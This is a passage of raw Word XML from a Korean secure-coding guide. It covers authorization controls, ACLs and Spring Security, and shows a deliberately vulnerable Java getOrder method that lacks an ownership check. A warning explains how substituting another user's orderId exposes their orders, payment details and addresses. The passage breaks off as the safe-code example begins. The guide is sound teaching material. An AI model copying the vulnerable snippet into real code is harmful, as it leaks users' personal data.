                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에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따라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배분하여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공격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노출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면을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최소화한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>사용자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권한에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따른</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> ACL(Access Control List)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>을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관리한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">• Spring Security </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>등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인가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프레임워크를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활용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>여부만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자신의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터인지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>함</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public OrderDto getOrder(int orderId) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return orderDao.findById(orderId);  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>타인의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>주문</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>조회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그인한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> A</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>타인의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> orderId(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>: orderId=9999)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> URL</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>호출하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>본인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소유</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>여부를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증하지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않으므로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>타인의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>주문</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내역</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>개인정보가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반환됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>고객의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>주문</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결제정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배송지를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>순차</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조회하는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수평적</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>상승</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>본인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소유</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터인지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
